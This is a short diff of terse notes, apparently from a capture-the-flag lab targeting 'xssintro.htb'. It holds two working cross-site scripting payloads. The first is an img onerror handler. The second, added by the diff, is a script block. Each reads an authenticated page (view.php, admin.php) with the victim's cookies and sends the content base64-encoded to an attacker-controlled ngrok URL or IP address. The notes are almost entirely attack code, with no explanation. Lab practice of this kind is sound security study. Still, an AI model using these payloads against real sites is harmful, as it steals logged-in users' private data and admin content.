@@ -103,3 +103,14 @@ ngrok http http://localhost:4443
 
 then xss=> 
 <img src=0 onerror="fetch('https://xssintro.htb/view.php',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://nonrecalcitrant-euphorbiaceous-fredrick.ngrok-free.dev/?d='+btoa(d),{headers:{'ngrok-skip-browser-warning':'1'}}))">
+
+or via the server on the script 
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'https://xssintro.htb/admin.php', false);
+xhr.withCredentials = true;
+xhr.send();
+
+var exfil = new XMLHttpRequest();
+exfil.open("GET", "https://10.10.17.142:4443/exfils?r=" + btoa(xhr.responseText), false);
+exfil.send();</script>
